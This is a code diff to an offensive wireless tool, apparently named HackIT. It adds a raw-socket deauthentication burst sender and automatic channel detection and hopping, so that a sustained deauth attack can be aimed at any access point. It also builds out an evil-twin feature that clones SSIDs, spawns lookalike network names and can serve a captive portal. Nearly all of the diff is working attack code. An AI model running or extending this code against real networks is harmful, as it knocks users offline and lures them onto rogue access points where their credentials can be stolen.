@@ -1129,10 +1129,37 @@ class HackITWirelessExecutor:
         return bytes(int(b, 16) for b in mac.replace("-", ":").split(":") if b)
 
     @staticmethod
+    def _send_deauth_burst(iface: str, bssid: str, station: str, count: int = 10, reason: int = 7):
+        try:
+            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+            sock.bind((iface, 0))
+        except:
+            return
+        seq = 0
+        targeted = station != "FF:FF:FF:FF:FF:FF"
+        for _ in range(count):
+            frame = HackITWirelessExecutor._craft_deauth_frame(bssid, station, reason, seq)
+            try: sock.send(frame)
+            except: pass
+            seq = (seq + 1) & 0xFFF
+            if targeted:
+                frame_cl = HackITWirelessExecutor._craft_deauth_frame(station, bssid, reason, seq)
+                try: sock.send(frame_cl)
+                except: pass
+                seq = (seq + 1) & 0xFFF
+        sock.close()
+
+    @staticmethod
     def _craft_deauth_frame(bssid: str, station: str, reason: int = 7, seq: int = 0) -> bytes:
         b = HackITWirelessExecutor._mac_bytes(bssid)
         s = HackITWirelessExecutor._mac_bytes(station)
-        radiotap = bytes([0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00])
+        radiotap = bytes([
+            0x00, 0x00,        # version=0, pad=0
+            0x0C, 0x00,        # length=12
+            0x02, 0x00, 0x00, 0x00,  # present=FLAGS (bit 1)
+            0x00,              # flags=0 (no WEP, no FCS appended)
+            0x00, 0x00, 0x00,  # padding to 4-byte boundary
+        ])
         fc = struct.pack("<H", 0x00C0)
         dur = struct.pack("<H", 0x013A)
         sctrl = struct.pack("<H", (seq << 4) & 0xFFFF)
@@ -1143,25 +1170,49 @@ class HackITWirelessExecutor:
     def do_deauth(self, iface: str, bssid: str, station: str = "", reason: int = 7, channel: int = 0, output: Optional[str] = None, **kwargs):
         iface = iface or self._default_iface()
         station = station or BROADCAST_MAC
-        UI.print_info(f"Deauth: {iface} → {bssid} → {station} (reason={reason}) — infinite, Ctrl+C to stop")
 
-        if channel:
+        # ── verify interface state ──
+        if not self._iface_exists(iface):
+            UI.print_error(f"[!] Interface {iface} not found")
+            return
+        if not self._iface_is_up(iface):
+            UI.print_info(f"[+] Bringing {iface} up...")
+            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
+        if not self._is_monitor_mode(iface):
+            UI.print_warning(f"[!] {iface} NOT in monitor mode — deauth may not work")
+            UI.print_warning(f"    Switch: mode {iface} monitor")
+
+        # ── channel setup ──
+        channels_24 = list(range(1, 14))
+        channels_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165, 169]
+        all_channels = channels_24 + channels_5
+
+        if not channel:
+            channel = self._detect_bssid_channel(iface, bssid)
+            if channel:
+                UI.print_info(f"[+] BSSID {bssid} on channel {channel}")
+                try:
+                    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True, timeout=3)
+                except:
+                    pass
+            else:
+                UI.print_info(f"[~] Channel for {bssid} unknown — cycling {len(all_channels)} ch round-robin")
+        else:
             try:
                 subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True, timeout=3)
-            except Exception:
+            except:
                 pass
 
-        station_bytes = HackITWirelessExecutor._mac_bytes(station)
-        bssid_bytes = HackITWirelessExecutor._mac_bytes(bssid)
+        UI.print_info(f"[*] Deauth: {iface} → {bssid} → {station} (reason={reason}) — Ctrl+C to stop")
 
         try:
             sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
             sock.bind((iface, 0))
         except PermissionError:
-            UI.print_error("Root required. Run with sudo.")
+            UI.print_error("[!] Root required. Run with sudo.")
             return
         except Exception as e:
-            UI.print_error(f"Cannot open raw socket on {iface}: {e}")
+            UI.print_error(f"[!] Cannot open raw socket on {iface}: {e}")
             return
 
         sent = 0
@@ -1175,8 +1226,20 @@ class HackITWirelessExecutor:
         signal.signal(signal.SIGINT, _signal_handler)
         signal.signal(signal.SIGTERM, _signal_handler)
 
+        ch_idx = 0
+
         try:
             while not stop:
+                if not channel:
+                    cur_ch = all_channels[ch_idx % len(all_channels)]
+                    try:
+                        subprocess.run(["iw", "dev", iface, "set", "channel", str(cur_ch)], capture_output=True, timeout=2)
+                    except:
+                        pass
+                    ch_idx += 1
+                else:
+                    cur_ch = channel
+
                 for _ in range(50):
                     if stop:
                         break
@@ -1196,8 +1259,7 @@ class HackITWirelessExecutor:
                             pass
                         seq = (seq + 1) & 0xFFF
 
-                if sent % 500 == 0 and not stop:
-                    _console.print(f"\r  [cyan]⚡ Deauth attacking {bssid}: {sent} frames sent[/cyan]", end="")
+                _console.print(f"  [cyan]⚡ Deauth {bssid}: {sent} frames  (ch {cur_ch})[/cyan]")
 
         except KeyboardInterrupt:
             pass
@@ -1206,11 +1268,50 @@ class HackITWirelessExecutor:
             signal.signal(signal.SIGINT, signal.SIG_DFL)
             signal.signal(signal.SIGTERM, signal.SIG_DFL)
 
-        _console.print("")
         if sent:
-            UI.print_success(f"Deauth complete: {sent} frames sent → {bssid}")
+            UI.print_success(f"[+] Deauth complete: {sent} frames sent → {bssid}")
         else:
-            UI.print_error(f"Deauth failed: 0 frames sent. Check monitor mode on {iface}")
+            UI.print_error(f"[!] Deauth failed: 0 frames sent. Check monitor mode on {iface}")
+
+    @staticmethod
+    def _iface_exists(iface: str) -> bool:
+        return os.path.exists(f"/sys/class/net/{iface}")
+
+    @staticmethod
+    def _iface_is_up(iface: str) -> bool:
+        try:
+            r = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True, timeout=5)
+            return "UP" in r.stdout.splitlines()[0] if r.stdout else False
+        except:
+            return False
+
+    @staticmethod
+    def _is_monitor_mode(iface: str) -> bool:
+        try:
+            r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=5)
+            return "type monitor" in r.stdout
+        except:
+            return False
+
+    @staticmethod
+    def _detect_bssid_channel(iface: str, bssid: str) -> int:
+        try:
+            r = subprocess.run(["iw", "dev", iface, "scan"], capture_output=True, text=True, timeout=10)
+            curr = ""
+            bssid_u = bssid.upper().replace("-", ":")
+            for line in r.stdout.splitlines():
+                ls = line.strip()
+                if ls.startswith("BSS "):
+                    raw = ls[4:].split()[0].upper() if len(ls) > 4 else ""
+                    curr = raw.replace("-", ":")
+                elif ls.startswith("freq:") and curr == bssid_u:
+                    freq = int(ls.split()[-1])
+                    if freq < 2484: return (freq - 2412) // 5 + 1
+                    if freq < 4500: return 14
+                    return (freq - 5180) // 5 + 36
+            return 0
+        except:
+            return 0
 
     def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50, channel: int = 6, caps: Optional[str] = None, **kwargs):
         iface = iface or self._default_iface()
@@ -1242,15 +1343,49 @@ class HackITWirelessExecutor:
                 _console.print(f"  {l}")
         proc.wait()
 
-    def do_eviltwin(self, iface: str, ssid: str, channel: int = 6, caps: Optional[str] = None, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
+    def do_eviltwin(self, iface: str, ssid: str, channel: int = 6, num_fake: int = 0, caps: Optional[str] = None, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
         if not ssid:
             UI.print_error("Specify SSID to clone.")
             return
         iface = iface or self._default_iface()
         UI.print_info(f"Evil Twin: cloning '{ssid}' on {iface} ch {channel}")
-        UI.print_info("Sending beacon frames with cloned SSID...")
-        self.do_beacon_flood(iface, ssid, 100, channel)
-        UI.print_info("Set up a DHCP server and AP on the same channel for full rogue AP.")
+
+        if num_fake > 0:
+            self.do_eviltwin_multi(iface, ssid, num_fake, channel, captive, bssid, dhcp_range)
+            return
+
+        from hackit.wireless.eviltwin_coordinator import EviltwinCoordinator
+        coord = EviltwinCoordinator(iface, ssid, channel, bssid)
+        coord.set_captive(captive, dhcp_range)
+        coord.start()
+        try:
+            while coord.is_alive():
+                import time
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            coord.stop()
+            UI.print_warning("Evil Twin stopped.")
+
+    def do_eviltwin_multi(self, iface: str, base_ssid: str, num: int, channel: int, captive: bool, bssid: Optional[str], dhcp_range: Optional[str]):
+        import random, string
+        suffixes = ["_5G", "_2G", "_Guest", "_VPN", "_IoT", "_Mesh", "_EXT", "_Admin", "_Secure", "_Backup"]
+        ssids = [base_ssid]
+        for i in range(num):
+            sfx = suffixes[i % len(suffixes)]
+            tag = ''.join(random.choices(string.digits, k=2))
+            ssids.append(f"{base_ssid}{sfx}_{tag}")
+
+        from hackit.wireless.eviltwin_coordinator import EviltwinCoordinator
+        coord = EviltwinCoordinator(iface, ssids, channel, bssid)
+        coord.set_captive(captive, dhcp_range)
+        coord.start()
+        try:
+            while coord.is_alive():
+                import time
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            coord.stop()
+            UI.print_warning("Evil Twin stopped.")
 
     def do_rogue_ap(self, iface: str, ssid: Optional[str] = None, channel: int = 6, wpa2: bool = False, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
         UI.print_info(f"Starting rogue AP '{ssid}' on {iface} ch {channel}...")
@@ -1493,7 +1628,7 @@ class HackITWirelessExecutor:
                 continue
             UI.print_info(f"  → {ssid} ({bssid})")
             self.do_handshake_capture(iface, bssid, timeout=15)
-            self.do_deauth(iface, bssid, count=5)
+            self._send_deauth_burst(iface, bssid, "FF:FF:FF:FF:FF:FF", 10)
             time.sleep(2)
         UI.print_success("Step 3: Handshake capture complete. Check 'sessions'.")
 
